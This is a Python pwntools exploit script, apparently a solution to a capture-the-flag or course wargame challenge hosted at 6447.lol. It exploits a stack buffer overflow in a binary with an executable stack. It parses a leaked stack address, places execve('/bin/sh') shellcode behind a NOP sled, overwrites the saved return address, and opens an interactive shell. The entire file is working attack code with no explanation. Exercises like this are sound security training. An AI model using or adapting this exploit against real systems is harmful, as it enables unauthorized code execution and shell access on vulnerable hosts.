#!/usr/bin/env python3

# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *
import argparse

HOST = "6447.lol"
PORT = 3002

context.arch = "amd64"

offset_from_rbp = 8192 # from cyclic
# offset_from_rip = offset_from_rbp + 8
nop_size = 100

asm_hex = "0x" + ''.join(reversed([hex(ord(x))[2:] for x in "/bin/sh"]))
shellcode = asm(
    "xor rsi, rsi\n"            
    "xor rdx, rdx\n"           
    f"mov rax, {asm_hex}\n"     
    "push rax\n"                
    "mov rdi, rsp\n"            
    "mov rax, 59\n"             
    "syscall\n"
)

def exploit(p):
    reply = p.recvlines(3)
    ptr = re.search('0x(.{12})', str(reply[2])).group(0)
    address = int(ptr, 16)
    log.info("Random address pointer: %s | %s" % (ptr, p64(address)))

    payload = fit({(offset_from_rbp - len(shellcode)): shellcode, (offset_from_rbp + 8): p64(address)}, filler='\x90', length=(offset_from_rbp + 16))

    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process(f"{__file__.replace('_sol.py', '')}")

    exploit(p)
    